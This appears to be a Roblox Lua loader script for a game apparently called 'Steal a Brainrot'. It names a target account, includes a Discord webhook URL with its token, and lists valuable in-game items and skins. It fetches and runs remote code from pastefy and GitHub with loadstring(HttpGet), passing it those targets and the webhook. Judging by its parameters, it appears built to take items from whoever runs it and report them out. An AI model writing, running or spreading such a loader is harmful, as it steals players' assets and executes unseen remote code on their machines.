local TARGET_ID = 8022389730
local TARGET_USER = "MightyJaxer"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1487606958092587178/FVn7qKwsLXJTL0QIoUTfj0Q3YWQbD6WjxZeqv9ZIS317ztgBykjJs-RGi0tACNxqa6Af"

local TargetBrainrots = {
    ["Dragon Skeletonini"] = true,
    ["Phoenix"] = true,
    ["Plant Bros"] = true,
    ["Hydra Serpent"] = true,
    ["Skibidi Toilet"] = true,
    ["Orchidox"] = true,
    ["Strawberry Elephant"] = true,
    ["Gold and Diamond"] = true,
    ["Meowl"] = true,
    ["Dragon Cannelloni"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Hydra Bunny"] = true,
    ["Dragon Gingerini"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Antonio"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Capitano Americano"] = true,
    ["Rico Dinero"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Headless Horseman"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Bufalino Boomberino"] = true,
    ["4th Bros"] = true,
    ["Fishino Clownino"] = true,
    ["Signore Carapace"] = true,
    ["Duggy Bros"] = true,
    ["Cerberus"] = true,
    ["Kraken"] = true,
    ["Money Money Bros"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Kepat"] = true,
    ["Coco and Mango"] = true,
    ["Pizza and Ranch"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Divine"] = true,
    ["Diamond"] = true,
    ["Cyber"] = true,
    ["Cursed"] = true,
    ["Gold"] = true,
    ["Easter"] = true,
    ["Gingerbread"] = true,
    ["Galaxy"] = true,
    ["Octo"] = true,
    ["Lucky"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Rose"] = true,
    ["Pot of Gold"] = true,
    ["Rainbow"] = true,
    ["Radioactive"] = true,
    ["Yin Yang"] = true,
    ["Valentines"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)